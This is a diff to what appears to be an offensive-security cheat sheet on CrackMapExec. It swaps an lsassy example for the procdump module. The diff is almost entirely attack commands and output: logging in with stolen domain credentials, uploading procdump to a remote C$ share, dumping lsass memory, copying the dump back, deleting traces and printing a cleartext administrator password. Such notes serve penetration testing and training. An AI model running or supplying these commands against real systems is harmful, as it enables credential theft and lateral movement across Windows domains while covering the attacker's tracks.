@@ -348,15 +348,22 @@ LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswo
 LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
 ```
 
-If the lsassy module fails, then use the following instead using [sysinternals procdump]({{< ref "sysinternals" >}}):
+Using procdump (sysinternals).
 
 ```plain
-$ cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy -o DUMP_METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe
-
-SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
-SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
-LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswordIsToHardToCrack!
-LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
+$ cme smb 10.10.10.10 -u johndo-adm -p Welkom1234 -M procdump        
+SMB         10.10.10.10     445    IITJUMPHOST      [*] Windows 10.0 Build 20348 x64 (name:IITJUMPHOST) (domain:OFFSEC.nl) (signing:False) (SMBv1:False)
+SMB         10.10.10.10     445    IITJUMPHOST      [+] OFFSEC.nl\johndo-adm:Welkom1234 (Pwn3d!)
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Copy /tmp/procdump.exe to C:\Windows\Temp\
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Created file procdump.exe on the \\C$\Windows\Temp\
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Executing command C:\Windows\Temp\procdump.exe -accepteula -ma 760 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Process lsass.exe was successfully dumped
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [*] Copy IITJUMPHOST-AMD64-OFFSEC.dmp to host
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Dumpfile of lsass.exe was transferred to /tmp/IITJUMPHOST-AMD64-OFFSEC.dmp
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Deleted procdump file on the C$ share
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      [+] Deleted lsass.dmp file on the C$ share
+PROCDUMP    10.10.10.10     445    IITJUMPHOST      offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
 ```
 
 Other modules that can be used.
